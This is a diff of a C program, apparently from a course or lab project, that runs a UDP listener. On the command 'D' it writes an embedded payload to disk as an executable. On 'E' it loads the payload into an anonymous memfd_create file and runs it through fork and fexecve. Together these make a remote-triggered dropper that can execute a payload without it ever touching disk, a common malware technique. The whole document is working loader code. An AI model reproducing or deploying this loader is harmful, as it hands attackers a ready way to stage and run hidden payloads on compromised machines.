@@ -8,11 +8,13 @@
 #include <unistd.h>
 #include <wait.h>
 #include <fcntl.h>
-#include <sys/mman.h> 
-#include <sys/stat.h>
+#include <sys/mman.h>   
+#include <sys/stat.h>   
+#include <signal.h>     
+#include <sys/syscall.h> 
 #include "hiding.h"
 
-
+// Variables from hiding.h
 extern unsigned char hiding_c[];
 extern unsigned int hiding_c_len;
 
@@ -37,8 +39,8 @@ int main(void){
 
 	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
 	if (sockfd < 0) {
-	perror("[-]socket error");
-	exit(1);
+	    perror("[-]socket error");
+	    exit(1);
 	}
 
 	memset(&server_addr, '\0', sizeof(server_addr));
@@ -48,12 +50,12 @@ int main(void){
 
 	n = bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
 	if (n < 0){
-	perror("[-]bind error");
-	exit(1);
+	    perror("[-]bind error");
+	    exit(1);
 	}
 
 	bzero(buffer, sizeof(buffer));printf("---> %s\n", buffer);
-			bzero(buffer, sizeof(buffer));
+	bzero(buffer, sizeof(buffer));
 	addr_size = sizeof(client_addr);
 	
 	//--this is to register the handler function--//
@@ -66,78 +68,64 @@ int main(void){
 		exit(1);
 	}
 	
-		while(1) //this is ther server, everything happens in here 
+	while(1)
+	{
+		recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&client_addr, &addr_size);
+		
+
+		if(strcmp(buffer, "D") == 0)
 		{
-			recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&client_addr, &addr_size);
-			//copy evrything from sockfd into the buffer, starting at bu[0-2], from the client IP addr
-
-
-			//Step 1: Check to see if the buffer is D or E
-			//Step 2: If D, then deploy (need payload compiled, turned into header)
-			// use open (file descriptors), to write payload as an executable binary
-			//Step 3: If E, the fork, execv the written binaries 
+			printf("I got a D\n");
 			
+			int payload_fd = open("payload.c", O_WRONLY | O_CREAT | O_TRUNC, 0700);
+			write(payload_fd, payload, payload_len);
+			close(payload_fd); 
+		} else if(strcmp(buffer, "E") == 0)
+		{
+			printf("I got an E (Execute command). Loading payload into memory...\n");
+			
+			int fd = syscall(__NR_memfd_create, "in_memory_payload", MFD_CLOEXEC);
+			if (fd == -1) {
+				perror("[-]syscall(memfd_create) failed");
+			}
 
-			//use strcmp for the buffer to see if D or E
-			//strcmp, 0 if both are identical
-
-			if(strcmp(buffer, "D") == 0)
-			{
-				printf("I got a D\n");
-				//payload person would xxd the payload 
-				//I include it as a header 
-				//two terminals, 1 client and 1 server to test it all
-
-				//fd open and write 
-
-				int payload_fd = open("payload.c", O_WRONLY | O_CREAT | O_TRUNC, 0700);
-				write(payload_fd, payload, payload_len);
-				close(payload_fd);
-			}else if(strcmp(buffer, "E") == 0)
-			{
-				printf("I got an E (Execute command). Loading payload into memory...\n");
+			ssize_t bytes_written = write(fd, payload, payload_len);
+			if (bytes_written != payload_len) {
+				perror("[-]write to memfd failed (Incomplete write)");
+				close(fd);
+			} else {
+				printf("[+]Payload loaded into memory (%u bytes).\n", payload_len); 
+			}
+			
+			pid_t p1fork = fork();
+			
+			if (p1fork == 0) {
+				// Child process
+				pid_t parentID = getppid();
+				char pbuffer[16];
+				sprintf(pbuffer, "%d", parentID);
 				
-				int fd = memfd_create("in_memory_payload", MFD_CLOEXEC);
-				if (fd == -1) {
-					perror("[-]memfd_create failed");
-				}
-
-				// *** CHANGE IS HERE ***
-				ssize_t bytes_written = write(fd, payload, payload_len);
-				if (bytes_written != payload_len) {
-					perror("[-]write to memfd failed (Incomplete write)");
-					close(fd);
-				} else {
-					printf("[+]Payload loaded into memory (%u bytes).\n", payload_len); // Changed type specifier
-				}
+				char *args[] = {"/proc/self/fd/in_memory_payload", pbuffer, NULL}; 
+				char *envp[] = {NULL}; 
 				
-				pid_t p1fork = fork();
+				printf("[+]Child (PID %d) executing in-memory payload...\n", getpid());
 				
-				if (p1fork == 0) {
-					pid_t parentID = getppid();
-					char pbuffer[16];
-					sprintf(pbuffer, "%d", parentID);
-					
-					char *args[] = {"/proc/self/fd/memfd_payload", pbuffer, NULL}; 
-					char *envp[] = {NULL}; 
-					
-					printf("[+]Child (PID %d) executing in-memory payload...\n", getpid());
-					
-					fexecve(fd, args, envp);
-					
-					perror("[-]fexecve failed"); 
-					exit(1); 
-					
-				} else if (p1fork > 0) {
-					printf("[+]Payload process started with PID: %d\n", p1fork);
-					close(fd);
-				} else {
-					perror("[-]fork error");
-				}
+				fexecve(fd, args, envp);
+				
+				perror("[-]fexecve failed"); 
+				exit(1); 
+				
+			} else if (p1fork > 0) {
+				// Parent process
+				printf("[+]Payload process started with PID: %d\n", p1fork);
+				close(fd); 
+			} else {
+				perror("[-]fork error");
 			}
 		}
-		
-		bzero(buffer, 2);
+	}
+	
+	bzero(buffer, 2);
 
-return 0;
+    return 0;
 }
